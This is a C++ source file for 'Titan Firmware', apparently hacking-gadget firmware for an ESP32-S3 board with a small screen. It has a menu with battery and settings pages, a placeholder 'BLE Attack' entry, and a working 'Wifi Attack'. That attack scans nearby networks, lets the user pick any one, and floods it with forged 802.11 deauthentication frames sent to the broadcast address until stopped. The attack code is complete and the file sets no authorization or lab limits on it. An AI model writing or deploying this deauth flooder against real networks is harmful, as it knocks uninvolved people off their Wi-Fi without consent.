#include <TFT_eSPI.h>
#include <WiFi.h>
#include <FS.h>
#include <SD.h>
#include <esp_adc_cal.h>
#include "esp_wifi.h"
#include "titan.h"
#include "pin_config.h"

// -------------------------------------------------------------------
// Macro for conversion to RGB565 format (5-6-5)
// -------------------------------------------------------------------
#define COLOR565(r, g, b) ( (((r) & 0xF8) << 8) | (((g) & 0xFC) << 3) | (((b) & 0xF8) >> 3) )

// -------------------------------------------------------------------
// Definition of GPIO and constants
// -------------------------------------------------------------------
#define BACKLIGHT_PIN 15
#define BUTTON_A      0
#define BUTTON_B      14
#define PIN_BAT_VOLT  4

const char* firmware_version = "1.1.2";

// Main menu
const char* menu_items[] = {"Wifi Attack", "BLE Attack", "Info", "Settings", "Battery Info", "Turn Off"};
const int menu_size = sizeof(menu_items) / sizeof(menu_items[0]);
int current_menu_index = 0;

// Colors used
const uint16_t COLOR_RED    = COLOR565(255, 0, 0);
const uint16_t COLOR_WHITE  = COLOR565(255, 255, 255);
const uint16_t COLOR_ORANGE = COLOR565(255, 165, 0);
const uint16_t COLOR_VIOLET = COLOR565(138, 43, 226);
const uint16_t COLOR_BLUE   = COLOR565(0, 0, 255);
const uint16_t COLOR_BLACK  = 0x0000;

uint16_t main_color = COLOR_VIOLET;  // Default main color
int brightness = 255;                // Brightness (0-255)

// Button states for debouncing
bool buttonA_pressed = false;
bool buttonB_pressed = false;

// Instance of the TFT screen
TFT_eSPI tft = TFT_eSPI();

// -------------------------------------------------------------------
// Backlight configuration via LEDC (for ESP32)
// -------------------------------------------------------------------
const int LEDC_CHANNEL    = 0;
const int LEDC_FREQUENCY  = 5000;
const int LEDC_RESOLUTION = 8; // 8 bits => 0-255

// -------------------------------------------------------------------
// Splash Screen (startup screen)
// -------------------------------------------------------------------
void showSplashScreen() {
  tft.fillScreen(COLOR_BLACK);
  const int imgWidth = 170;
  const int imgHeight = 170;
  int x = (tft.width() - imgWidth) / 2;
  int y = (tft.height() - imgHeight) / 2;
  tft.pushImage(x, y, imgWidth, imgHeight, titan);
  delay(5000); // Display for 5 seconds
}

// -------------------------------------------------------------------
// Utility functions for buttons (simple debouncing)
// -------------------------------------------------------------------
void waitForButtonPress(int pin) {
  while (digitalRead(pin) == HIGH) {
    delay(50);
  }
  delay(200); // Debouncing
}

bool isButtonPressed(int pin, bool &buttonState) {
  if (digitalRead(pin) == LOW && !buttonState) {
    buttonState = true;
    delay(200);  // Debouncing
    return true;
  }
  if (digitalRead(pin) == HIGH && buttonState) {
    buttonState = false;
  }
  return false;
}

// -------------------------------------------------------------------
// Display of the main menu
// -------------------------------------------------------------------
void displayMenu() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(3);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(menu_items[current_menu_index], tft.width() / 2, tft.height() / 2);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Titan Firmware", 5, 5);

  tft.setTextDatum(BL_DATUM);
  tft.drawString(firmware_version, 5, tft.height() - 5);

  String categoryText = "Category: " + String(current_menu_index + 1) + "/" + String(menu_size);
  tft.setTextDatum(BR_DATUM);
  tft.drawString(categoryText, tft.width() - 5, tft.height() - 5);

  // Display of battery percentage
  displayBatteryPercentage();
}

// -------------------------------------------------------------------
// Construction and sending of deauthentication packets (WiFi attack)
// -------------------------------------------------------------------

// Constants for the deauthentication frame
const int DEAUTH_FRAME_SIZE = 26;
const uint8_t FRAME_CONTROL_DEAUTH[2] = {0xC0, 0x00};
const uint8_t DURATION[2] = {0x00, 0x00};
const uint8_t SEQUENCE[2] = {0x00, 0x00};
const uint8_t REASON_CODE[2] = {0x07, 0x00};
const uint8_t BROADCAST_ADDR[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

void buildDeauthFrame(const uint8_t *bssid, uint8_t *frameBuffer) {
  int index = 0;
  memcpy(frameBuffer + index, FRAME_CONTROL_DEAUTH, sizeof(FRAME_CONTROL_DEAUTH));
  index += sizeof(FRAME_CONTROL_DEAUTH);
  memcpy(frameBuffer + index, DURATION, sizeof(DURATION));
  index += sizeof(DURATION);
  memcpy(frameBuffer + index, BROADCAST_ADDR, sizeof(BROADCAST_ADDR));
  index += sizeof(BROADCAST_ADDR);
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, bssid, 6);
  index += 6;
  memcpy(frameBuffer + index, SEQUENCE, sizeof(SEQUENCE));
  index += sizeof(SEQUENCE);
  memcpy(frameBuffer + index, REASON_CODE, sizeof(REASON_CODE));
}

// Continuous sending of deauth packets until interrupted by the user
void continuousDeauthAttack(const uint8_t *bssid, int channel) {
  if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
    Serial.println("Error setting WiFi channel");
    return;
  }

  uint8_t deauthFrame[DEAUTH_FRAME_SIZE];
  buildDeauthFrame(bssid, deauthFrame);

  // Display of ongoing attack
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Attack in progress", tft.width() / 2, 20);
  tft.setTextSize(1);
  tft.drawString("A: Stop", tft.width() / 2, tft.height() - 20);

  uint32_t packetCount = 0;
  uint32_t lastUpdate = millis();
  char buf[20];

  while (!isButtonPressed(BUTTON_A, buttonA_pressed)) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, DEAUTH_FRAME_SIZE, false);
    packetCount++;

    if (millis() - lastUpdate >= 100) {
      tft.fillRect(0, 40, tft.width(), 20, COLOR_BLACK);
      sprintf(buf, "Packets: %lu", packetCount);
      tft.setTextColor(main_color, COLOR_BLACK);
      tft.setTextDatum(TC_DATUM);
      tft.drawString(buf, tft.width()/2, 50);
      lastUpdate = millis();
    }
  }
  Serial.println("Stopping attack");
  delay(500); // Debouncing
}

// -------------------------------------------------------------------
// Display of the WiFi Attack category with network selection
// -------------------------------------------------------------------
void displayWifiAttack() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Wifi Attack", tft.width() / 2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  tft.drawString("Scanning networks...", 10, 50);

  int n = WiFi.scanNetworks();
  delay(500);  // Allow time for the scan to complete

  if (n == 0) {
    tft.fillScreen(COLOR_BLACK);
    tft.drawString("No networks found", 10, 70);
    waitForButtonPress(BUTTON_A);
    displayMenu();
    return;
  }

  int targetIndex = 0;
  bool selectionDone = false;
  const int pageSize = 5;
  int pageStart = 0;

  const int listY = 40;
  const int listH = pageSize * 20;

  while (!selectionDone) {
    // Selection header
    tft.fillRect(0, 0, tft.width(), listY, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Select Network", tft.width() / 2, 10);

    // Calculation of the page to center the selection
    pageStart = targetIndex - pageSize / 2;
    if (pageStart < 0) pageStart = 0;
    if (pageStart + pageSize > n) pageStart = n - pageSize;
    if (pageStart < 0) pageStart = 0;

    // Display of the list
    tft.fillRect(0, listY, tft.width(), listH, COLOR_BLACK);
    for (int i = pageStart; i < pageStart + pageSize && i < n; i++) {
      int yPos = listY + (i - pageStart) * 20;
      String ssid = WiFi.SSID(i);
      if (ssid.length() > 20) {
        ssid = ssid.substring(0, 20) + "...";
      }
      String info = String(i + 1) + ": " + ssid + " (Ch:" + String(WiFi.channel(i)) + ")";

      if (i == targetIndex) {
        tft.fillRect(5, yPos - 2, tft.width() - 10, 18, main_color);
        tft.setTextColor(COLOR_BLACK, main_color);
      } else {
        tft.setTextColor(main_color, COLOR_BLACK);
      }
      tft.setTextSize(1);
      tft.setTextDatum(TL_DATUM);
      tft.drawString(info, 10, yPos);
    }

    // Instructions
    tft.fillRect(0, tft.height() - 20, tft.width(), 20, COLOR_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("B: Next | A: Select", tft.width()/2, tft.height()-15);

    if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
      targetIndex = (targetIndex + 1) % n;
      delay(200);
    }
    if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
      selectionDone = true;
      delay(200);
    }
    delay(50);
  }

  // Confirmation of the selection
  tft.fillScreen(COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString("Target:", tft.width() / 2, 30);
  tft.drawString(WiFi.SSID(targetIndex), tft.width() / 2, 60);
  delay(2000);

  uint8_t* bssid = WiFi.BSSID(targetIndex);
  int channel = WiFi.channel(targetIndex);

  continuousDeauthAttack(bssid, channel);
  displayMenu();
}

// -------------------------------------------------------------------
// Display of system information
// -------------------------------------------------------------------
void displayInfo() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Information", tft.width() / 2, 20);

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  const char* infos[] = {
    "Chip: ESP32-S3",
    "Screen: 170x320",
    "Flash: 16MB",
    "PSRAM: 8MB",
    "Battery: N/A"
  };
  for (int i = 0; i < 5; i++) {
    tft.drawString(infos[i], 10, 50 + i * 20);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// -------------------------------------------------------------------
// Display of battery information
// -------------------------------------------------------------------
void displayBatteryInfo() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Battery Info", tft.width() / 2, 20);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  tft.setTextSize(1);
  tft.setTextDatum(TL_DATUM);
  if (voltage > 4300) {
    tft.drawString("No battery connected!", 10, 50);
  } else {
    tft.drawString("Voltage: " + String(voltage) + " mV", 10, 50);
  }
  waitForButtonPress(BUTTON_A);
  displayMenu();
}

// -------------------------------------------------------------------
// Display of battery percentage
// -------------------------------------------------------------------
void displayBatteryPercentage() {
  esp_adc_cal_characteristics_t adc_chars;
  esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, 1100, &adc_chars);

  uint32_t raw = analogRead(PIN_BAT_VOLT);
  uint32_t voltage = esp_adc_cal_raw_to_voltage(raw, &adc_chars) * 2;

  int percentage = map(voltage, 3300, 4200, 0, 100); // Example mapping
  if (percentage < 0) percentage = 0;
  if (percentage > 100) percentage = 100;

  tft.setTextSize(1);
  tft.setTextDatum(TR_DATUM);
  tft.setTextColor(main_color, COLOR_BLACK);
  tft.drawString(String(percentage) + "%", tft.width() - 5, 5);
}

// -------------------------------------------------------------------
// Function to turn off the screen
// -------------------------------------------------------------------
void turnOffDisplay() {
  tft.fillScreen(COLOR_BLACK);
  tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
  tft.setTextSize(2);
  tft.setTextDatum(MC_DATUM);
  tft.drawString("Turning Off...", tft.width() / 2, tft.height() / 2);
  delay(1000);

  digitalWrite(PIN_POWER_ON, LOW);
  digitalWrite(PIN_LCD_BL, LOW);
  tft.writecommand(0x10);
  esp_sleep_enable_ext0_wakeup((gpio_num_t)PIN_BUTTON_2, 0); // Wake up with button 2
  esp_deep_sleep_start();
}

// -------------------------------------------------------------------
// Display of settings (main color and brightness)
// -------------------------------------------------------------------
void displaySettings() {
  const char* colors[] = {"Red", "White", "Orange", "Violet", "Blue"};
  uint16_t color_values[] = {COLOR_RED, COLOR_WHITE, COLOR_ORANGE, COLOR_VIOLET, COLOR_BLUE};
  int color_index = 0;
  while (true) {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(main_color, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Settings", tft.width() / 2, 20);

    tft.setTextSize(2);
    tft.drawString("Main color:", tft.width() / 2, tft.height() / 2 - 30);
    tft.setTextSize(3);
    tft.drawString(colors[color_index], tft.width() / 2, tft.height() / 2);

    tft.setTextSize(2);
    tft.drawString("Brightness: " + String(brightness), tft.width() / 2, tft.height() / 2 + 50);

    // Adjust brightness with button A
    if (digitalRead(BUTTON_A) == LOW) {
      brightness += 20;
      if (brightness > 255) brightness = 20;
      ledcWrite(LEDC_CHANNEL, brightness);
      delay(200);
    }
    // Change color or return to menu with button B (long press)
    if (digitalRead(BUTTON_B) == LOW) {
      unsigned long press_time = millis();
      while (digitalRead(BUTTON_B) == LOW) {
        if (millis() - press_time > 1000) {
          displayMenu();
          return;
        }
      }
      color_index = (color_index + 1) % 5;
      main_color = color_values[color_index];
      delay(200);
    }
    delay(100);
  }
}

// -------------------------------------------------------------------
// Selection of a category in the menu
// -------------------------------------------------------------------
void enterCategory() {
  String currentItem = menu_items[current_menu_index];
  if (currentItem == "Wifi Attack") {
    displayWifiAttack();
  } else if (currentItem == "Info") {
    displayInfo();
  } else if (currentItem == "Settings") {
    displaySettings();
  } else if (currentItem == "Battery Info") {
    displayBatteryInfo();
  } else if (currentItem == "BLE Attack") {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("BLE Attack", tft.width() / 2, tft.height() / 2);
    delay(1000);
    displayMenu();
  } else if (currentItem == "Turn Off") {
    turnOffDisplay();
  } else {
    tft.fillScreen(COLOR_BLACK);
    tft.setTextColor(COLOR_WHITE, COLOR_BLACK);
    tft.setTextSize(2);
    tft.setTextDatum(MC_DATUM);
    tft.drawString("Unknown Menu", tft.width() / 2, tft.height() / 2);
    delay(1000);
    displayMenu();
  }
}

// -------------------------------------------------------------------
// Button handling in the main loop
// -------------------------------------------------------------------
void handleButtonPress() {
  if (isButtonPressed(BUTTON_A, buttonA_pressed)) {
    enterCategory();
  } else if (isButtonPressed(BUTTON_B, buttonB_pressed)) {
    current_menu_index = (current_menu_index + 1) % menu_size;
    displayMenu();
  }
}

// -------------------------------------------------------------------
// Setup function
// -------------------------------------------------------------------
void setup() {
  Serial.begin(115200);

  // Backlight configuration via LEDC (ESP32)
  pinMode(BACKLIGHT_PIN, OUTPUT);
  ledcSetup(LEDC_CHANNEL, LEDC_FREQUENCY, LEDC_RESOLUTION);
  ledcAttachPin(BACKLIGHT_PIN, LEDC_CHANNEL);
  ledcWrite(LEDC_CHANNEL, brightness);

  pinMode(BUTTON_A, INPUT_PULLUP);
  pinMode(BUTTON_B, INPUT_PULLUP);

  tft.init();
  tft.setRotation(1);
  tft.fillScreen(COLOR_BLACK);

  // WiFi configuration in station mode (for esp_wifi_80211_tx)
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  showSplashScreen();
  displayMenu();
}

// -------------------------------------------------------------------
// Main loop
// -------------------------------------------------------------------
void loop() {
  handleButtonPress();
  delay(50);
}
